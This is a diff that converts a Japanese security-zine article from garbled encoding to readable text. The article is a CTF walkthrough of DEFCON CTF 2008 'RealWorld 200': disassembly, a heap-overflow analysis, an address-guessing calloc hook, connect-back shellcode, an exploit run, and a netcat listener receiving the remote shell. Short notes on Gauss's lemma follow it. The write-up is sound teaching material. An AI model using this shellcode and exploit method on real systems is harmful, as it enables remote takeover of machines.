+　Webサイトを見ると分かる通り、このコンテストでは様々な分野の問題が出題さ
+れます。よって、勝ち抜くためには幅広いセキュリティの知識が必要となります。
+今回は、この中から小さなヒープ領域を利用したRemote Exploiting系の問題を攻
+略します。では、RealWorld 200の問題をダウンロードしてください。
+
+　DEFCON CTF 2008 RealWorld 200
+　http://nopsr.us/ctf2008qual/realworld200-be2241fd5ac13d18c2360046dba7ed0e
+
+
+■0x03.) IDAProで逆アセンブルコードを追う
+
+　まず、ダウンロードしたファイルが何のタイプのファイルであるかを調べます。
 
 -----  terminal
 # file realworld200-be2241fd5ac13d18c2360046dba7ed0e 
@@ -696,27 +696,27 @@ libs), FreeBSD-style, stripped
 #
 -----
 
-�@file�R�}���h�ɂ��AELF���s�t�@�C���ł���AFreeBSD�œ��삷�邱�Ƃ�����
-��܂����B���s�t�@�C���ł��邽�߁A�t�A�Z���u�����ĉ�͂��܂��B�t�A�Z���u
-���ɂ�IDAPro���g�p���܂��B
-�@IDAPro�͏��p�̋t�A�Z���u���ł����A�Â��o�[�W�����ł���uversion 4.9�v��
-�t���[�E�F�A�Ƃ��Ė������J����Ă��܂��B���p�łƔ�ׂ�Ƌ@�\�͐��������
-���܂����A�\���ɗL�p�ȃ��x���ł��邽�߁A�܂��͂�����_�E�����[�h���܂��B
+　fileコマンドにより、ELF実行ファイルであり、FreeBSDで動作することが分か
+りました。実行ファイルであるため、逆アセンブルして解析します。逆アセンブ
+ルにはIDAProを使用します。
+　IDAProは商用の逆アセンブラですが、古いバージョンである「version 4.9」が
+フリーウェアとして無償公開されています。商用版と比べると機能は制限されて
+いますが、十分に有用なレベルであるため、まずはこれをダウンロードします。
 
-�@IDAPro �t���[�E�F�A��
-�@http://www.hex-rays.com/idapro/idadownfreeware.htm
+　IDAPro フリーウェア版
+　http://www.hex-rays.com/idapro/idadownfreeware.htm
 
-�@IDAPro�Ŏ��s�t�@�C�����J�������͂��s���A�t�A�Z���u���R�[�h���\����
-��܂��B�܂��͂ǂ̂悤�Ȋ֐����Ăяo����Ă��邩�𒲂ׂ邽�߁uCtrl + F12�v
-�ŁA�֐��R�[���̘A���\�����O���t�����ĕ\�����܂��B����ƁAbind�Alisten�A
-accept�Ƃ������A��ʓI�ȃT�[�o���Ăяo���֐����R�[�����Ă��܂��B
-�@�T�[�o�̏ꍇ�A����accept�̌��fork�Ŏq�������A�������ɃN���C�A���g
-�Ƃ̏������Ϗ����邽�߁A�d�v�ȕ�����accept����fork���Ăяo����Ă����A
-�̏����ł��BWinGraph32�iCtrl + F12�ŋN�����ꂽ�v���O�����j�̊֐��̌Ăяo
-���\���̌��ʂ���A08049144�̊֐���accept��fork���Ăяo���Ă��邱�Ƃ�����
-��܂��B�ł́A���̊֐�����͂��܂��B
+　IDAProで実行ファイルを開いたら解析が行われ、逆アセンブルコードが表示さ
+れます。まずはどのような関数が呼び出されているかを調べるため「Ctrl + F12」
+で、関数コールの連結構造をグラフ化して表示します。すると、bind、listen、
+acceptといった、一般的なサーバが呼び出す関数をコールしています。
+　サーバの場合、大抵はacceptの後にforkで子供を作り、そっちにクライアント
+との処理を委譲するため、重要な部分はacceptからforkが呼び出されている一連
+の処理です。WinGraph32（Ctrl + F12で起動されたプログラム）の関数の呼び出
+し構造の結果から、08049144の関数がacceptとforkを呼び出していることが分か
+ります。では、その関数を解析します。
 
------  IDAPro�i08049144�j
+-----  IDAPro（08049144）
 .text:08049144 status          = dword ptr -30h
 .text:08049144 var_2C          = dword ptr -2Ch
 .text:08049144 peer            = sockaddr ptr -28h
@@ -768,15 +768,15 @@ accept�Ƃ������A��ʓI�ȃT�[�o���Ăяo���֐����R�[�����Ă��܂��B
 .text:080491BA                 call    _exit
 -----
 
-�@fork���Ăяo����A�v���Z�X���V���ɐ������ꂽ�Ƃ���ŁA�u�G���[�����v�u
-�e�̏����v�u�q�̏����v��3�ɏ��������򂵂Ă���̂�������܂��B�G���[����
-�Ɛe�̏����͊֌W�Ȃ����߁A�q�̏�����ǂ��܂��B����ƁA0804919E�Łucall eax�v
-�����s���Ă��܂��B���̂ЂƂO��mov���߂ŁAeax�Ɉ����̒l�����Ă��邽�߁A
-���̊֐��ɓn���������̏ꏊ�փW�����v���邱�Ƃ�������܂��B�ł́A������x
-WinGraph32�����āA�֐�08049144���Ăяo���Ă���֐����m�F���܂��B
-�@����Ɗ֐�08048D44���A�֐�08049144���Ăяo���Ă��܂��B
+　forkが呼び出され、プロセスが新たに生成されたところで、「エラー処理」「
+親の処理」「子の処理」の3つに処理が分岐しているのが分かります。エラー処理
+と親の処理は関係ないため、子の処理を追います。すると、0804919Eで「call eax」
+を実行しています。そのひとつ前のmov命令で、eaxに引数の値を入れているため、
+この関数に渡される引数の場所へジャンプすることが分かります。では、もう一度
+WinGraph32を見て、関数08049144を呼び出している関数を確認します。
+　すると関数08048D44が、関数08049144を呼び出しています。
 
------  IDAPro�i08048D44�j
+-----  IDAPro（08048D44）
 .text:08048D44 var_4           = dword ptr -4
 .text:08048D44
 .text:08048D44                 push    ebp
@@ -805,12 +805,12 @@ WinGraph32�����āA�֐�08049144���Ăяo���Ă���֐����m�F���܂��B
 .text:08048D93                 retn
 -----
 
-�@�A�h���X08048D85�Ŋ֐�08049144���Ăяo���Ă��܂����A�Ăяo���O��08048C
-E0���X�^�b�N�֊i�[���Ă��܂��B����āA08048CE0�ȍ~���Afork���eax�Ɋi�[��
-��Ăяo�����֐��ƂȂ�܂��B�ł́Aeax�Ɋi�[����call�����֐���ǂ��܂��B
-�������炪�{�Ԃł��B
+　アドレス08048D85で関数08049144を呼び出していますが、呼び出し前に08048C
+E0をスタックへ格納しています。よって、08048CE0以降が、fork後にeaxに格納さ
+れ呼び出される関数となります。では、eaxに格納されcallされる関数を追います。
+ここからが本番です。
 
------  IDAPro�i08048CE0�j
+-----  IDAPro（08048CE0）
 .text:08048CE0
 .text:08048CE0 var_4           = dword ptr -4
 .text:08048CE0 fildes          = dword ptr  8
@@ -851,12 +851,12 @@ E0���X�^�b�N�֊i�[���Ă��܂��B����āA08048CE0�ȍ~���Afork���eax�Ɋi�[��
 .text:08048D42                 leave
 .text:08048D43                 retn
 -----
-�@
-�@08048CED�ɂāA�ucall sub_8048BE0�v���Ăяo����܂��B�܂��A08048D0E��08
-048D24�ɂāA�ucall sub_8048E24�v���Ăяo����܂��B
-�@�ł́A�ǂ݂₷���悤��C����̃R�[�h�ɕϊ����܂��B
+　
+　08048CEDにて、「call sub_8048BE0」が呼び出されます。また、08048D0Eと08
+048D24にて、「call sub_8048E24」が呼び出されます。
+　では、読みやすいようにC言語のコードに変換します。
 
------  �蓮�f�R���p�C���i8048CE0�j
+-----  手動デコンパイル（8048CE0）
 int sub_8048CE0(int fd)
 {
         unsigned char *p = 0;
@@ -877,10 +877,10 @@ int sub_8048CE0(int fd)
 }
 -----
 
-�@�������A�Ăяo����Ă���2�̊֐����t�A�Z���u�����āAC����Ƀf�R���p�C
-�����܂��B
+　同じく、呼び出されている2つの関数も逆アセンブルして、C言語にデコンパイ
+ルします。
 
------  IDAPro�i08048BE0�j
+-----  IDAPro（08048BE0）
 .text:08048BE0
 .text:08048BE0 var_18          = dword ptr -18h
 .text:08048BE0 buf             = dword ptr -14h
@@ -971,7 +971,7 @@ int sub_8048CE0(int fd)
 .text:08048CDE sub_8048BE0     endp
 -----
 
------  �蓮�f�R���p�C���i8048BE0�j
+-----  手動デコンパイル（8048BE0）
 int sub_8048BE0(void)
 {
         int rd, i;
@@ -1005,9 +1005,9 @@ int sub_8048BE0(void)
 }
 -----
 
-�@������08048E24�ł��B
+　続いて08048E24です。
 
------  IDAPro�i08048E24�j
+-----  IDAPro（08048E24）
 .text:08048E24
 .text:08048E24 var_14          = dword ptr -14h
 .text:08048E24 var_10          = dword ptr -10h
@@ -1071,7 +1071,7 @@ int sub_8048BE0(void)
 .text:08048EA7                 retn
 -----
 
------  �蓮�f�R���p�C���i8048E24�j
+-----  手動デコンパイル（8048E24）
 int sub_8048E24(int fd, unsigned char *buff, int size, int crlf)
 {
         int s = 0;
@@ -1095,35 +1095,35 @@ int sub_8048E24(int fd, unsigned char *buff, int size, int crlf)
 }
 -----
 
-�@�s��������΂�����̎蓮�f�R���p�C���Ȃ̂ŁA���X�R�[�h�������i���Ԉ�
-�������肻���j�ł����A���쌴����m���͂����炭���Ȃ��Ǝv���܂��B�{��
-�Ȃ�΋t�A�Z���u�����ꂽ�R�[�h��ǂ݂Ȃ���Ǝ�ȕ�����T�����ƂɂȂ�܂�
-���A����͕�����₷��C����ɏ��������܂����B���̃R�[�h�����āA�ǂ�������
-�d�g�݂ɂȂ��Ă��邩����͂��܂��B
-�@�܂��Asub_8048CE0����ŏ��ɌĂяo����Ă���sub_8048BE0�ł����A����́A
-�������Ă���֐��ł��傤���H�@���͂���́Acalloc�Ŋm�ۂ����̈�̃A�h���X
-�������_���Ȓl�ɂ��邽�߂̏����ł��B0x0400�񂾂�calloc���Ăяo���Ă���A
-���̒����烉���_���łЂƂ����I�сAfree�ŉ�����܂��B���̏�ԂŊ֐����I
-�������A�Ăяo������sub_8048CE0�֖߂�ƁA�߂�����ł́A�ēxcalloc���Ăяo
-����܂��B���̂Ƃ��Asub_8048BE0���Ń����_���l�ɂ���đI�΂�Afree�ŉ����
-�ꂽ�ꏊ���A�ēx�������̈�Ƃ��Ċ��蓖�Ă��܂��B�܂�A���ʓI�ɁA0x04
-00�p�^�[���̃A�h���X�l�̒����烉���_���ɑI�΂ꂽ�������̈悪�Asub_8048E2
-4���܂߂��ȍ~�̏����Ŏg���܂��B
-�@�ł́Asub_8048E24�͉�������Ă���֐����Ƃ����ƁA����͈����Ɂu�t�@�C��
-�n���h���v�u�ۑ��o�b�t�@�v�u�ő�T�C�Y�v�u�I�[�����v��4��n���A�t�@�C��
-�n���h������A�u�ő�T�C�Y�ɂȂ邩�v���邢�́u�I�[������������v�܂ŁA
-�ۑ��o�b�t�@�փf�[�^�������o���������s���܂��B
-�@�����𓥂܂��āA������xsub_8048CE0�̏����Ɩ�蕔�����l���܂��B�܂��A
-�����_���ȃA�h���X�ł͂���܂����Acalloc�Ń�������0x44�o�C�g�m�ۂ���A��
-��0x44�o�C�g�̗̈�Ɂu�I�[����'\n'��������܂Łv�N���C�A���g���瑗���
-���f�[�^���R�s�[���܂��B���ɍēx�A���x��calloc�Ŋm�ۂ��ꂽ�擪�������A�h
-���X+0x20����A�������u�I�[����'\n'��������܂Łv�N���C�A���g���瑗���
-���f�[�^���R�s�[���܂��B���Ȃ݂ɁA������0x44�o�C�g�����m�ۂ��Ă��Ȃ��̈�
-�ɑ΂��āA+0x20�̏ꏊ����0x44�o�C�g�i�܂�0x64�o�C�g�j�f�[�^���R�s�[����
-���邽�߁A�q�[�v�I�[�o�[�t���[���������Ă��܂��B�����āA�Ō�ɁA+0x40����
-��4�o�C�g�l��call���߂ɂ��W�����v���Ă��邽�߁A�����ŁA�C�ӂ̃R�[�h����
-�s�����邽�߂̃W�����v��A�h���X���w��ł��܂��B
-�@�������܂Ƃ߂�ƁA�ȉ��̃������}�b�v�ɂȂ�܂��B
+　行き当たりばったりの手動デコンパイルなので、少々コードが汚い（かつ間違
+いがありそう）ですが、動作原理を知る上はおそらく問題ないと思います。本来
+ならば逆アセンブルされたコードを読みながら脆弱な部分を探すことになります
+が、今回は分かりやすくC言語に書き直しました。このコードを見て、どういった
+仕組みになっているかを解析します。
+　まず、sub_8048CE0から最初に呼び出されているsub_8048BE0ですが、これは、
+何をしている関数でしょうか？　実はこれは、callocで確保した領域のアドレス
+をランダムな値にするための処理です。0x0400回だけcallocを呼び出しており、
+その中からランダムでひとつだけ選び、freeで解放します。その状態で関数を終
+了させ、呼び出し元のsub_8048CE0へ戻ると、戻った先では、再度callocが呼び出
+されます。このとき、sub_8048BE0内でランダム値によって選ばれ、freeで解放さ
+れた場所が、再度メモリ領域として割り当てられます。つまり、結果的に、0x04
+00パターンのアドレス値の中からランダムに選ばれたメモリ領域が、sub_8048E2
+4も含めた以降の処理で使われます。
+　では、sub_8048E24は何をやっている関数かというと、これは引数に「ファイル
+ハンドル」「保存バッファ」「最大サイズ」「終端文字」の4つを渡し、ファイル
+ハンドルから、「最大サイズになるか」あるいは「終端文字が見つかる」まで、
+保存バッファへデータを書き出す処理を行います。
+　これらを踏まえて、もう一度sub_8048CE0の処理と問題部分を考えます。まず、
+ランダムなアドレスではありますが、callocでメモリが0x44バイト確保され、そ
+の0x44バイトの領域に「終端文字'\n'が見つかるまで」クライアントから送られ
+たデータをコピーします。次に再度、今度はcallocで確保された先頭メモリアド
+レス+0x20から、同じく「終端文字'\n'が見つかるまで」クライアントから送られ
+たデータをコピーします。ちなみに、ここで0x44バイトしか確保していない領域
+に対して、+0x20の場所から0x44バイト（つまり0x64バイト）データをコピーして
+いるため、ヒープオーバーフローが発生しています。そして、最後に、+0x40から
+の4バイト値へcall命令によりジャンプしているため、ここで、任意のコードを実
+行させるためのジャンプ先アドレスを指定できます。
+　これらをまとめると、以下のメモリマップになります。
 
   <------------- calloc -------------->
   +----| |------+----------------+----------------+----------------+----+
@@ -1131,26 +1131,26 @@ int sub_8048E24(int fd, unsigned char *buff, int size, int crlf)
   +----| |------+----------------+----------------+----------------+----+
  0x00          0x30             0x40             0x50             0x60 0x64
 
-�@���āAADDR�ɂ�shellcode�ւ̃A�h���X������K�v�����邽�߁A�����A0x40�o
-�C�g�������R�ɏ��������ł��郁�����̈�͂���܂���B�܂�A0x40�o�C�g��
-���̃����[�g�pshellcode��p�ӂ���K�v������܂��B�������́AADDR�̑O��jmp
-���߂�u���AADDR���i4�o�C�g�j���΂����ƂŁA�ő�0x64�iADDR��jmp���Ȃ���
-0x5E�j���Ashellcode�p�Ɏg�p�ł��܂��B
-�@�܂�A���̖��́A0x40��������0x64�o�C�g�Ɏ��܂郊���[�g�p��shellc
-ode��p�ӂ���K�v������Ƃ������ƁA�����đ��̖��́A���̗̈悪calloc��
-����ă����_���Ɍ��肳�ꂽ�̈�ł��邽�߁A�A�h���X�����ߑł��ł��Ȃ��Ƃ�
-�����ƁA����2���������ׂ��ǂƂȂ�܂��B���Ȃ݂ɉ������1�ł͂���܂�
-��B�������@�͂���������܂��̂ŁA�����ōl���Ă݂�̂��悢�ł��傤�B
+　さて、ADDRにはshellcodeへのアドレスを入れる必要があるため、実質、0x40バ
+イトしか自由に書き換えできるメモリ領域はありません。つまり、0x40バイト以
+下のリモート用shellcodeを用意する必要があります。もしくは、ADDRの前にjmp
+命令を置き、ADDR分（4バイト）を飛ばすことで、最大0x64（ADDRとjmpを省くと
+0x5E）分、shellcode用に使用できます。
+　つまり、第一の問題は、0x40もしくは0x64バイトに収まるリモート用のshellc
+odeを用意する必要があるということ、そして第二の問題は、この領域がcallocに
+よってランダムに決定された領域であるため、アドレスを決め打ちできないとい
+うこと、この2つが解決すべき壁となります。ちなみに解決策は1つではありませ
+ん。解く方法はいくつもありますので、自分で考えてみるのもよいでしょう。
 
 
-��0x04.) �A�h���X������shellcode�̍쐬
+■0x04.) アドレス推測とshellcodeの作成
 
-�@calloc�ɂ�胉���_���Ɍ��肳���̈�̃A�h���X��100%���Ă�͕̂s�\��
-�����A���̖��́Acalloc��0x0400��Ăяo���āA���̒�����ЂƂ����_����
-�I��ł��邽�߁A0x0400��i1024��j���s����΁A�m���I�ɂ�1��͓�����܂��B
-�܂�Aexploit���u���[�g�t�H�[�X�I�ɓ����Ă����΁A����Ȃ�̊m���Ńq�b�g
-���܂��B
-�@calloc�֐����t�b�N���āA�A�h���X�̌���񋓂��܂��B
+　callocによりランダムに決定される領域のアドレスを100%当てるのは不可能で
+すが、この問題は、callocを0x0400回呼び出して、その中からひとつランダムに
+選んでいるため、0x0400回（1024回）試行すれば、確率的には1回は当たります。
+つまり、exploitをブルートフォース的に投げていけば、それなりの確率でヒット
+します。
+　calloc関数をフックして、アドレスの候補を列挙します。
 
 -----  calloc_hook.c
 #define _GNU_SOURCE
@@ -1174,7 +1174,7 @@ void * calloc(size_t nmemb, size_t size)
 }
 -----
 
-�@calloc�֐����t�b�N������ԂŁA�v���O���������s���܂��B
+　calloc関数をフックした状態で、プログラムを実行します。
 
 -----  freebsd terminal
 # gcc -shared -fPIC -o calloc_hook.so calloc_hook.c -dl
@@ -1183,15 +1183,15 @@ void * calloc(size_t nmemb, size_t size)
 # ./realworld200-be2241fd5ac13d18c2360046dba7ed0e
 -----
 
-�@���s����ƃ|�[�g3344�Őڑ��҂���ԂɂȂ�̂ŁA�ʂ̃}�V������connect����
-���B
+　実行するとポート3344で接続待ち状態になるので、別のマシンからconnectしま
+す。
 
 -----  attack terminal
 # nc 10.81.45.21 3344
 -----
 
-�@connect����ƁAcalloc�֐���1024��Ăяo����܂��B�����āA�֐��t�b�N�ɂ�
-��Acalloc�̖߂�l���o�͂���܂��B
+　connectすると、calloc関数が1024回呼び出されます。そして、関数フックによ
+り、callocの戻り値が出力されます。
 
 -----  freebsd terminal
 # ./realworld200-be2241fd5ac13d18c2360046dba7ed0e
@@ -1207,12 +1207,12 @@ void * calloc(size_t nmemb, size_t size)
 08053800
 -----
 
-�@���̒�����D���ȃA�h���X��I�сA���ߑł����܂��B���ߑł��ɂ����Ƃ��Ă��A
-1024�񎎍s����΁A1��͐�������m���Ȃ̂ŁA�����̓u���[�g�t�H�[�X�ōU����
-�܂��B
+　この中から好きなアドレスを選び、決め打ちします。決め打ちにしたとしても、
+1024回試行すれば、1回は成功する確率なので、ここはブルートフォースで攻略し
+ます。
 
-�@����shellcode�̖��ł����A����̓T�C�Y���c��ɂ���킯�ł͂Ȃ����߁A��
-�̓_���኱�l�����č쐬���܂��B
+　次にshellcodeの問題ですが、今回はサイズが膨大にあるわけではないため、そ
+の点を若干考慮して作成します。
 
 -----  shellcode.s
 .globl main
@@ -1257,7 +1257,7 @@ L1:     mov        $0x5A, %al
         .string "ADDR"
 -----
 
-�@�A�Z���u���ŏ����āA�}�V����ɕϊ����܂��B
+　アセンブラで書いて、マシン語に変換します。
 
 -----  freebsd terminal
 # gcc shellcode.s -o shellcode
@@ -1308,7 +1308,7 @@ L1:     mov        $0x5A, %al
  8048407:        52                           push   %edx
 -----
 
-�@shellcode������exploit���쐬���܂��B
+　shellcodeを元にexploitを作成します。
 
 -----  exploit200.py
 #!/usr/bin/python
@@ -1341,41 +1341,41 @@ if __name__ == "__main__":
                 s.close
 -----
 
-�@����쐬����shellcode�́Asocket���J���Aconnect�֐����Ăяo���ĔC�ӂ̃T
-�[�o�փR�l�N�V�������s�����̂ł��B�uREMOTE ADDR�v��4�o�C�g�ɃT�[�o��IP�A
-�h���X���A�������uREMOTE PORT�v�̉���2�o�C�g�ɃT�[�o�̃|�[�g���w�肵�܂��B
-�����āuRET ADDRESS�v�ɂ́A���������������A�h���X�icalloc�̖߂�l�j��ݒ�
-���܂��B
-�@�����[�g����ΏۂƂ����A�^�b�N�ł́Abind�Alisten�Aaccept���s���A�O��
-����ڑ���҂��󂯂�ubind�^�v��shellcode���ǂ��g���܂����A�����shell
-code��u���郁�����̈悪���Ȃ��������߁i0x40�o�C�g�j���̂悤��shellcode��
-���܂����B����āA�����瑤�ő҂��󂯗p�̃T�[�o���p�ӂ��܂��B�҂��󂯗p��
-�T�[�o�ɂ́Anetcat���g���܂��B
+　今回作成したshellcodeは、socketを開き、connect関数を呼び出して任意のサ
+ーバへコネクションを行うものです。「REMOTE ADDR」の4バイトにサーバのIPア
+ドレスを、同じく「REMOTE PORT」の下位2バイトにサーバのポートを指定します。
+そして「RET ADDRESS」には、推測したメモリアドレス（callocの戻り値）を設定
+します。
+　リモート環境を対象としたアタックでは、bind、listen、acceptを行い、外部
+から接続を待ち受ける「bind型」のshellcodeも良く使われますが、今回はshell
+codeを置けるメモリ領域が少なかったため（0x40バイト）このようなshellcodeに
+しました。よって、こちら側で待ち受け用のサーバも用意します。待ち受け用の
+サーバには、netcatを使います。
 
 -----  attack terminal
 # nc -l 7777
 -----
 
-�@�����āA�^�[�Q�b�g�ƂȂ�}�V���ŁArealworld200�v���O�������N�����܂��B
+　続いて、ターゲットとなるマシンで、realworld200プログラムを起動します。
 
 -----  target terminal
 # ./realworld200-be2241fd5ac13d18c2360046dba7ed0e
 -----
 
-�@�����āA�^�[�Q�b�g�}�V���̃|�[�g3344�irealworld200�v���O���������p����
-�|�[�g�j�ցAexploit�𑗐M���܂��B
+　そして、ターゲットマシンのポート3344（realworld200プログラムが利用する
+ポート）へ、exploitを送信します。
 
 -----  attack terminal
 # python exploit200.py
 -----
 
-�@���Ƃ͊m���̖��ł����A�A�h���X��calloc�œ�����A�h���X�͈͂Ƀ}�b�`
-���Ă���΁A300�`400��Łi�v�����exploit200.py��3�`4����s����΁j�U����
-�������܂��B�U��������������Anetcat����Atarget�}�V�����D���܂��B
+　あとは確率の問題ですが、アドレスがcallocで得られるアドレス範囲にマッチ
+していれば、300〜400回で（要するにexploit200.pyを3〜4回実行すれば）攻撃は
+成功します。攻撃が成功したら、netcatから、targetマシンが奪えます。
 
 -----  attack terminal
 # nc -l 7777
-ls�i�R�}���h���ʂ�j
+ls（コマンドが通る）
 .cshrc
 .login
 .login_conf
@@ -1386,620 +1386,620 @@ ls�i�R�}���h���ʂ�j
 .shrc
 realworld200-be2241.core
 realworld200-be2241fd5ac13d18c2360046dba7ed0e
-key�i�p�X���[�h�����I�j
+key（パスワード発見！）
 -----
 
-�@�ȏ�ōU�������ł��B�������������ł��傤���H�@���̖��̓����́A������
-�p���ăA�h���X�𐄑��ł��Ȃ��悤�ɂ��Ă���_�A�����āA�����ɏ������i���A
-shellcode�����ߍ��߂��Ȃ����x���ł͌����ĂȂ����x�́j�������̈�A��2�_
-���Ȃ��Ȃ��ʔ����Ƃ��낾�����Ǝv���܂��B
+　以上で攻略完了です。いかがだったでしょうか？　この問題の特徴は、乱数を
+用いてアドレスを推測できないようにしている点、そして、微妙に小さい（が、
+shellcodeが埋め込められないレベルでは決してない程度の）メモリ領域、の2点
+がなかなか面白いところだったと思います。
 
 
-��0x05.) �ʂ̍U�����@
+■0x05.) 別の攻撃方法
 
-�@���̖��ɂ́A�͔͉𓚂�����܂���B�l����΂܂��܂��l�X�ȕ��@������
-����Ǝv���܂��B�Ⴆ�΁A�����0x40�o�C�g�ɖ����shellcode���������݂�
-�������Ajmp���߂��g���āuRET ADDRESS�v���΂��悤�ɂ���΁A������������
-�̃������̈��shellcode�u����Ƃ��Ďg�p�ł��܂��B����ɁAshellcode���ł�
-����x�A�L���A�h���X�̈���w�肵��sub_08048E24�֐����Ăяo���΁A�U���҂�
-�v���̂܂܂̃T�C�Y��shellcode�p�̈悪�p�ӂł��܂��B�Ȃɂ����̖��v���O��
-���̓����ɂ́A1023�~0x44�o�C�g�̉����g���Ă��Ȃ��̈悪����킯�ł�����B
-�@�܂��A���̖��ɋ���������΁ADEFCON CTF 2008�N�́uPotent Pwnables 200�v
-�̖��������Ă݂�̂��悢�Ǝv���܂��B
-
-
-��0x06.) ��������
-
-�@����̓n�b�L���O�R���e�X�g�uDEFCON CTF 2008�v�̖���������܂������A
-�������������ł��傤���H�@���̑��͖��N6����{����ɗ\�I���s���Ă���A
-���̗\�I�ɏ����c�����i��j7�g������������X�x�K�X�ōs���ATOP�����߂܂��B
-���E���̃Z�L�����e�B�G���W�j�A���Q�����Ă��܂��̂ŁA��͂背�x���͍�����
-�����A�����ȃZ�L�����e�B�̖�肾���ł͂Ȃ��A�p�Y���I�Ȃ��̂␔�w�I�Ȃ���
-�܂ŕ��L����肪����܂��B�\�I�̓����[�g�ŁAWeb�ŃA�J�E���g�o�^���邾����
-�Q���ł���̂ŁA��������������΁A���N2009�N��CTF�ɒ��킵�Ă݂Ă��y������
-������܂���B
-�@�܂��A���{�ł��L�u���W�߂āuCTF�׋���v�ihttp://ja.avtokyo.org/projects�j
-�Ƃ����C�x���g����1��J�Â��Ă��܂��B�����������������ΎQ�����Ă݂Ă͂�
-���ł��傤���B
-
-�@���āA����ȂƂ���ŁA���N���c��킸���ƂȂ�܂����B���N�͌l�I�ɂ͓{
-���̂悤��1�N�ł������A�U��Ԃ��Ă݂�Ɗy�����v���o�ł��B���N���A�U��Ԃ�
-�Ă݂Ċy���������ȂƎv����1�N�ɂ������Ǝv���܂��B�ł́A�܂����N�������
-���傤�B
+　この問題には、模範解答がありません。考えればまだまだ様々な方法が見つけ
+られると思います。例えば、今回は0x40バイトに無理矢理shellcodeを押し込みま
+したが、jmp命令を使って「RET ADDRESS」を飛ばすようにすれば、もう少し多く
+のメモリ領域をshellcode置き場として使用できます。さらに、shellcode内でも
+う一度、広いアドレス領域を指定してsub_08048E24関数を呼び出せば、攻撃者の
+思いのままのサイズのshellcode用領域が用意できます。なにせこの問題プログラ
+ムの内部には、1023×0x44バイトの何も使っていない領域があるわけですから。
+　また、この問題に興味があれば、DEFCON CTF 2008年の「Potent Pwnables 200」
+の問題を解いてみるのもよいと思います。
 
 
+■0x06.) さいごに
 
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
-x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+　今回はハッキングコンテスト「DEFCON CTF 2008」の問題解説をやりましたが、
+いかがだったでしょうか？　この大会は毎年6月上旬ごろに予選が行われており、
+その予選に勝ち残った（約）7組が決勝戦をラスベガスで行い、TOPを決めます。
+世界中のセキュリティエンジニアが参加していますので、やはりレベルは高いで
+すし、純粋なセキュリティの問題だけではなく、パズル的なものや数学的なもの
+まで幅広い問題があります。予選はリモートで、Webでアカウント登録するだけで
+参加できるので、もし興味があれば、来年2009年のCTFに挑戦してみても楽しいか
+もしれません。
+　また、日本でも有志を集めて「CTF勉強会」（http://ja.avtokyo.org/projects）
+というイベントを月1回開催しています。こちらも興味があれば参加してみてはど
+うでしょうか。
 
---- ��5��: ��b�Í��w�u���E��19�� �`������]�̑��ݖ@���` ---
+　さて、そんなところで、今年も残りわずかとなりました。今年は個人的には怒
+濤のような1年でしたが、振り返ってみると楽しい思い出です。来年も、振り返っ
+てみて楽しかったなと思える1年にしたいと思います。では、また来年お会いしま
+しょう。
 
-���ҁFIPUSIRON
+
 
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
+--- 第5章: 基礎暗号学講座・第19回 〜平方剰余の相互法則〜 ---
 
-��0x01.) �͂��߂�
+著者：IPUSIRON
 
-�@�O���WB43�ł̓��W�����h���L���Ƃ��̐����ɂ��ĐG�ꂽ�B
-�@����͕�����](a/p)���v�Z���邽�߂ɕ֗��ȓ���Ƃ��āA��[�@���Ƒ��ݖ@��
-���Љ��B
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
 
 
-��0x02.) �K�E�X�̕��
+■0x01.) はじめに
 
-�@�����Ȃ�藝���L�q����̂ł͂Ȃ��A���l��Ŋώ@���Ă݂�B
+　前回のWB43ではルジャンドル記号とその性質について触れた。
+　今回は平方剰余(a/p)を計算するために便利な道具として、補充法則と相互法則
+を紹介する。
 
-�@p=11,a=7�Ƃ���Ba��1�{����5�{�i=(p-1)/2=10/2)�܂ł̐�������B
 
-a�~1, a�~2, a�~3, a�~4, a�~5
+■0x02.) ガウスの補題
 
-��
+　いきなり定理を記述するのではなく、数値例で観察してみる。
 
-7�~1, 7�~2, 7�~3, 7�~4, 7�~5
+　p=11,a=7とする。aの1倍から5倍（=(p-1)/2=10/2)までの数列を作る。
 
-��
+a×1, a×2, a×3, a×4, a×5
+
+↓
+
+7×1, 7×2, 7×3, 7×4, 7×5
+
+↓
 
 7, 14, 21, 28, 35
 
-��mod p�����
+↓mod pを取る
 
 7, 3, 10, 6, 2
 
-��p/2=11/2=5.5���傫��������11�������B�����A�}�C�i�X�ŕ\�L����B
+↓p/2=11/2=5.5より大きい数から11を引く。即ち、マイナスで表記する。
 
--4, 3, -1, -5, 2	�����̐�����Βl�ŏ���]�ƌĂԁB
+-4, 3, -1, -5, 2	←この数列を絶対値最小剰余と呼ぶ。
 
-���}�C�i�X��������菜���B
+↓マイナス符号を取り除く。
 
-4, 3, 1, 5, 2		��1,2,3,4,5��1�ʂ茻��Ă���B
+4, 3, 1, 5, 2		←1,2,3,4,5が1通り現れている。
 
-�@���̂Ƃ��A���W�����h���L��(a/p)���v�Z����B
+　このとき、ルジャンドル記号(a/p)を計算する。
 
 (a/p)
 =(7/11)
 =7^{(11-1)/2}
 =7^5
-��-1 mod 11
+≡-1 mod 11
 
-�@����A(-1)^(��Βl�ŏ���]�̒��̕��̐��̌�)���v�Z����B���̐��̌���
-3�Ȃ̂ŁA(-1)^3=-1�ɂȂ�B���̒l-1��(a/p)�̒l�ƈ�v���Ă���B
+　一方、(-1)^(絶対値最小剰余の中の負の数の個数)を計算する。負の数の個数は
+3個なので、(-1)^3=-1になる。この値-1は(a/p)の値と一致している。
 
-�@�ȏ��p=11,a=7�̏ꍇ�̋c�_�ł��������A��ʂ̏ꍇ�ł����藧�B������K
-�E�X�̕��Ƃ����B
+　以上はp=11,a=7の場合の議論であったが、一般の場合でも成り立つ。これをガ
+ウスの補題という。
 
